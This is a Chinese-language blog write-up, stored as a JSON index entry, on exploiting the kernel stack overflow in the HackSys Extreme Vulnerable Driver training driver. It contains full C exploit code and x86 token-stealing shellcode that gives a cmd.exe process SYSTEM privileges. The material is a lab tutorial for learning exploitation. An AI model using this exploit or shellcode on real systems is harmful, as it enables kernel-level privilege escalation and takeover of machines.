{"categories":[],"posts":[{"content":"源码分析 RtlCopyMemory 函数是一个 Windows API 函数，能将一块内存数据从一个地方复制到另一个地方。\n存在漏洞的 107 行，Size未做验证，且由 Ring3 决定，所以存在内核栈溢出。\n漏洞分析 IDA pro 打开驱动 找到 TriggerStackOverflow的方法有两种：通过 IOCTL 和 特定函数。\n通过 IOCTL： HEVD 的 IOCTL 通过 IrpDeviceIoCtlHandler 实现：\n当 eax = 0x222003h 时，程序调用 StackOverflow 模块：\n因此当 IOCTL = 0x222003h时，程序调用 StackOverflow 模块。\n通过函数： 找到内存拷贝函数 __memcpy，x 查看调用情况，找到 TriggerStackOverflow\n进入地址\n调用函数 ProbeForRead，此函数是用来判断这块内存是否为 Ring3 的内存，大小为 0x800h\n下方输出调试信息，也调用了 esi，即 KernelBuffer Size 为 0x800h：\n调用 __memcpy 的函数在模块开始处偏移 0x8F 处\n在 windbg 中调试 在 TriggerStackOverflow 开始处、调用 __memcpy 处下断点\nbu HEVD!TriggerStackOverflow bu HEVD!TriggerStackOverflow+0x8f  第0处断点： 查看寄存器：\nesp中存储的是返回地址，即 0x980f7ad4\n第1处断点： 调用 memcpy 函数\n查看寄存器：\n查看 esp ：\n调用函数前，会将参数依次 push，因此此处 esp 指向的 0x980f72b4 就是 memcpy 函数的第一个参数 KernelBuffer的地址。\n此处利用栈溢出原理：通过利用 memcpy 函数，覆盖返回地址为shellcode地址，从而调用 shellcode\n因此需要计算偏移，即 ：\nTriggerStackOverflow 返回地址（esp）- memcpy调用的第一个参数KernelBuffer（[esp]） = 0x820\n漏洞利用 根据分析所得的信息， KernelBuffer = 0x800h，KernelBuffer 到返回地址的偏移为 0x820h，因此，填充偏移 0x820为 shellcode 地址即可执行 shellcode\n尝试 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #define STACKOVERFLOW 0x222003 int main() { char buf[0x824]; DWORD bReturn = 0; HANDLE hDevice; hDevice = CreateFileA(\u0026quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026quot;, //打开的设备名称 GENERIC_READ | GENERIC_WRITE,\t// 对所打开的设备可读可写 FILE_SHARE_READ | FILE_SHARE_WRITE,\t//请求共享模式。对其属性或扩展属性的访问请求进行约束，必须与第二参数匹配 NULL, OPEN_EXISTING,\t//仅打开存在的设备 FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,\t//默认属性，允许对设备进行重叠操作 NULL ); printf(\u0026quot;Get Handle...\\n\u0026quot;); if (hDevice == NULL || hDevice == INVALID_HANDLE_VALUE)\t// 返回句柄为空或不可用 { printf(\u0026quot;Failed to get Handle...\\n\u0026quot;); return 0; } memset(buf, 'T', 0x824);\t//内存填充 0x824 个 T printf(\u0026quot;exploit...\\n\u0026quot;); DeviceIoControl(hDevice,\t//设备句柄 STACKOVERFLOW,\t//操作控制码 buf,\t//输入缓冲区的指针 0x824,\t//输入缓冲区的大小，字节数 NULL,\t//驱动程序返回给应用程序的数据缓冲区地址 0,\t//驱动程序返回给应用程序的数据缓冲区大小，字节数 \u0026amp;bReturn,\t//驱动程序实际返回给应用程序的数据字节数地址 NULL);\t//重叠操作 }  EIP 和 EBP 都被覆盖，说明此时已经覆盖了 EIP 可以控制程序执行流程。\n提权代码 windbg 下提权过程 查看进程 !dml_proc 查看进程  address 是EPROCESS（executive process block，进程执行块）的地址，记录该进程的关键信息 PID 是 进程号，system 的进程号为 4  查看 token 位置 dt命令主要用来查看相关的变量，结构体等的信息  查看 EPROCESS 类型结构，token 位于偏移 0xf8 处，结构为 _EX_FAST_REF  查看 system.exe 和 cmd.exe token： nt指内核 _EX_FAST_REF 指 token 的 结构 因为 token 在 EPROCESS 结构偏移 f8 的位置，所以查看 token 时要加 f8  system 进程 token 的值为 0x8ac01275 cmd 进程 token 的值为 0xa2087036  替换 token 以提权 ed 可以修改4字节内存值 g 可以让系统继续执行  修改后让系统继续执行并输入 whoami：\n过程的关键在于如何找到 EPROCESS。\nx86 上，FS 段寄存器用于指向 TEB（环境进程块）和 KPCR（处理器控制区），其偏移 0x124 为当前线程的 KTHREAD，KTHREAD 结构的偏移0x50处为 KPROCESS 结构，KPROCESS 结构是 EPROCESS 结构的第一个字段，因此也定位到了 EPROCESS。\n再通过 EPROCESS 偏移 0xB8 处的双向进程链表、偏移 0xB4 处的进程标识符以及System进程的进程标识符 4 遍历链表匹配到 System 进程。\n最后将 system EPROCESS 结构偏移 0xF8 处的 token 替换 当前 cmd 的 token\n汇编代码 pushad mov eax, fs:[124h]\t//将当前线程的 KTHREAD 地址存入 eax mov eax, [eax + 050h]\t//将 KPROCESS 结构首地址存入 eax mov ecx, eax\t//将 EPROCESS 结构首地址存入 ecx mov edx, 4\t//将 system pid 4 存入 edx find_sys_pid : mov eax, [eax + 0b8h]\t//将双向进程活动链表地址存入 eax sub eax, 0b8h\t//双向链表遍历 cmp[eax + 0b4h], edx\t//比较进程 pid 是否为 4 jnz find_sys_pid\t//PID != 4 时循环执行 mov edx, [eax + 0f8h]\t//将 system 进程的 token 赋给 edx mov[ecx + 0f8h], edx\t//将edx的值赋给当前线程的 token popad  此处还需要考虑一个问题，堆栈平衡。\n程序在读写数据的时候是通过地址查找的,如果函数调用之前的堆栈与函数调用之后的堆栈不一致,就可能导致找不到数据或找到的数据错误,有可能会导致程序崩溃。\n所以要使用 IDA pro，查看驱动在未进行利用时，正常的执行情况。\n在上述找到 TriggerStackOverflow 后，在 IDA pro 中输入 x 查看调用情况：\n跟进：\n程序在最后调用结束后，需要执行 pop ebp 与 ret 8\n在函数调用过程中，还会有 3 个 push\npush ebx push esi push edi  故最后的汇编应为：\npop edi pop esi pop ebx pushad mov eax, fs:[124h]\t//将当前线程的 KTHREAD 地址存入 eax mov eax, [eax + 050h]\t//将 KPROCESS 结构首地址存入 eax mov ecx, eax\t//将 KPROCESS 结构首地址存入 ecx mov edx, 4\t//将 system pid 4 存入 edx find_sys_pid : mov eax, [eax + 0b8h]\t//将双向进程活动链表地址存入 eax sub eax, 0b8h\t//双向链表遍历 cmp[eax + 0b4h], edx\t//比较进程 pid 是否为 4 jnz find_sys_pid\t//PID != 4 时循环执行 mov edx, [eax + 0f8h]\t//将 system 进程的 token 赋给 edx mov[ecx + 0f8h], edx\t//将edx的值赋给当前线程的 token popad pop ebp ret 8  EXP #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #define STACKOVERFLOW 0x222003 VOID ShellCode() { __asm { pop edi pop esi pop ebx pushad mov eax, fs:[124h] mov eax, [eax + 050h] mov ecx, eax mov edx, 4 find_sys_pid : mov eax, [eax + 0b8h] sub eax, 0b8h cmp[eax + 0b4h], edx jnz find_sys_pid mov edx, [eax + 0f8h] mov[ecx + 0f8h], edx popad pop ebp ret 8 } } int main() { char buf[0x824]; DWORD bReturn = 0; HANDLE hDevice; hDevice = CreateFileA(\u0026quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026quot;, //打开的设备名称 GENERIC_READ | GENERIC_WRITE,\t// 对所打开的设备可读可写 FILE_SHARE_READ | FILE_SHARE_WRITE,\t//请求共享模式。对其属性或扩展属性的访问请求进行约束，必须与第二参数匹配 NULL, OPEN_EXISTING,\t//仅打开存在的设备 FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,\t//默认属性，允许对设备进行重叠操作 NULL ); printf(\u0026quot;Get Handle...\\n\u0026quot;); if (hDevice == NULL || hDevice == INVALID_HANDLE_VALUE)\t// 返回句柄为空或不可用 { printf(\u0026quot;Failed to get Handle...\\n\u0026quot;); return 0; } memset(buf, 'T', 0x824);\t//内存填充 0x824 个 T *(PDWORD)(buf + 0x820) = (DWORD)\u0026amp;ShellCode; printf(\u0026quot;exploit...\\n\u0026quot;); DeviceIoControl(hDevice,\t//设备句柄 STACKOVERFLOW,\t//操作控制码 buf,\t//输入缓冲区的指针 0x824,\t//输入缓冲区的大小，字节数 NULL,\t//驱动程序返回给应用程序的数据缓冲区地址 0,\t//驱动程序返回给应用程序的数据缓冲区大小，字节数 \u0026amp;bReturn,\t//驱动程序实际返回给应用程序的数据字节数地址 NULL);\t//重叠操作 system(\u0026quot;cmd.exe\u0026quot;); return 0; }  结果 参考 ","id":0,"section":"posts","summary":"源码分析 RtlCopyMemory 函数是一个 Windows API 函数，能将一块内存数据从一个地方复制到另一个地方。 存在漏洞的 107 行，Size未做验证，且由 Ring3 决定，所以存在内核栈溢出。","tags":["Windows","HEVD"],"title":"HEVD 栈溢出","uri":"https://ryze.github.io/2021/01/hevd-%E6%A0%88%E6%BA%A2%E5%87%BA/","year":"2021"}],"tags":[{"title":"HEVD","uri":"https://ryze.github.io/tags/hevd/"},{"title":"Windows","uri":"https://ryze.github.io/tags/windows/"}]}